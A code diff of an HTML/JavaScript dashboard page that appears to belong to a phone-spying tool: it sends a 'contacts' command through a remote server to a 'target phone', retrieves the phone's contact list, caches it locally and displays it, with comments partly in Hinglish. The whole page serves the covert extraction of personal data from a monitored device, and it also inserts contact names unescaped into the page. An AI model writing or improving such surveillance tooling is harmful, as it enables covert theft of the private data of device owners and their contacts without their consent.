@@ -19,7 +19,7 @@
             background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             margin: 0; padding: 20px;
             display: flex; justify-content: center;
         }
@@ -52,27 +52,21 @@
         }
 
         .contact-card {
-            background: var(--glass-bg); padding: 15px;
+            background: var(--glass-bg); padding: 12px;
             border-radius: 15px; display: flex; align-items: center;
             border: 1px solid var(--glass-border); transition: 0.2s;
         }
-        .contact-card:hover { transform: translateX(5px); background: rgba(255,255,255,0.15); }
 
         .avatar {
             width: 40px; height: 40px;
             background: linear-gradient(45deg, #4caf50, #2e7d32);
             border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            font-weight: bold; margin-right: 15px; font-size: 1.1rem;
+            font-weight: bold; margin-right: 15px; flex-shrink: 0;
         }
 
         .info { flex: 1; overflow: hidden; }
         .name { font-size: 1rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .number { font-size: 0.85rem; color: var(--text-muted); margin-top: 2px; }
-
-        .call-icon {
-            color: var(--accent); font-size: 1.2rem; padding: 10px;
-            cursor: pointer; background: rgba(255,255,255,0.05); border-radius: 50%;
-        }
+        .number { font-size: 0.85rem; color: var(--text-muted); }
 
         .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
         
@@ -87,87 +81,96 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Contacts List</span>
-            <button onclick="fetchContacts()" class="refresh-btn"><i class="fa-solid fa-rotate"></i> Refresh</button>
+            <span class="page-title">Contacts</span>
+            <button onclick="fetchContacts()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i> Refresh</button>
         </div>
 
         <div class="contact-list" id="contactsContainer">
-            <div class="status-msg">
-                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                <p>Requesting Contacts from Phone...</p>
             </div>
-        </div>
     </div>
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "M2103K19I"; 
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id');
+
+        const storageKey = `contacts_${DEVICE_ID}`;
 
         document.addEventListener("DOMContentLoaded", () => {
+            if (!DEVICE_ID) {
+                alert("ID missing!");
+                window.location.href = "index.html";
+                return;
+            }
+
+            // 1. Pehle LocalStorage se purana data dikhao
+            loadFromStorage();
+
+            // 2. Command bhejo aur naya data fetch karo
             sendCommand();
-            // Phone ko thoda time do upload karne ke liye
-            setTimeout(fetchContacts, 7000); 
+            setTimeout(fetchContacts, 2000); 
         });
+
+        function loadFromStorage() {
+            const savedData = localStorage.getItem(storageKey);
+            if (savedData) {
+                renderContacts(JSON.parse(savedData));
+            } else {
+                document.getElementById("contactsContainer").innerHTML = `
+                    <div class="status-msg">
+                        <i class="fa-solid fa-circle-notch fa-spin"></i>
+                        <p>Loading for the first time...</p>
+                    </div>`;
+            }
+        }
 
         function sendCommand() {
             fetch(`${SERVER_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
-            }).then(() => console.log("Command Sent to Phone"));
+            });
         }
 
         function fetchContacts() {
-            const container = document.getElementById("contactsContainer");
-            
-            // ✅ CHANGE: Ab hum API route use kar rahe hain, direct file nahi
-            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${new Date().getTime()}`)
-                .then(response => {
-                    if (!response.ok) throw new Error("No Data Yet");
-                    return response.json();
-                })
+            const btn = document.getElementById("refreshBtn");
+            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i> Loading...';
+
+            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`)
+                .then(res => res.json())
                 .then(data => {
-                    // Agar API khali array [] bhej rahi hai
-                    if(!data || data.length === 0) {
-                        container.innerHTML = `
-                            <div class="status-msg">
-                                <i class="fa-solid fa-clock"></i>
-                                <p>Phone has not uploaded contacts yet.</p>
-                                <button onclick="fetchContacts()" class="refresh-btn" style="margin-top:10px">Try Again</button>
-                            </div>`;
-                        return;
+                    if (data && data.length > 0) {
+                        // 3. Naya data LocalStorage mein save karo
+                        localStorage.setItem(storageKey, JSON.stringify(data));
+                        renderContacts(data);
                     }
-
-                    container.innerHTML = ""; // Clear loading screen
-                    
-                    data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
-
-                    data.forEach(contact => {
-                        const name = contact.name || "Unknown";
-                        const initial = name.charAt(0).toUpperCase();
-                        const number = contact.number || contact.phone || "No Number";
-                        
-                        const card = `
-                            <div class="contact-card">
-                                <div class="avatar">${initial}</div>
-                                <div class="info">
-                                    <div class="name">${name}</div>
-                                    <div class="number">${number}</div>
-                                </div>
-                                <div class="call-icon"><i class="fa-solid fa-phone"></i></div>
-                            </div>`;
-                        container.innerHTML += card;
-                    });
                 })
-                .catch(err => {
-                    console.error("Error:", err);
-                    container.innerHTML = `
-                        <div class="status-msg">
-                            <i class="fa-solid fa-triangle-exclamation" style="color:orange"></i>
-                            <p>Connecting to Phone...</p>
-                            <small>Make sure the app is running on target phone.</small>
-                        </div>`;
+                .finally(() => {
+                    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> Refresh';
                 });
+        }
+
+        function renderContacts(data) {
+            const container = document.getElementById("contactsContainer");
+            container.innerHTML = "";
+            
+            data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+
+            data.forEach(contact => {
+                const name = contact.name || "Unknown";
+                const number = contact.number || contact.phone || "No Number";
+                const initial = name.charAt(0).toUpperCase();
+                
+                container.innerHTML += `
+                    <div class="contact-card">
+                        <div class="avatar">${initial}</div>
+                        <div class="info">
+                            <div class="name">${name}</div>
+                            <div class="number">${number}</div>
+                        </div>
+                        <div style="color:var(--accent)"><i class="fa-solid fa-phone"></i></div>
+                    </div>`;
+            });
         }
     </script>
 </body>
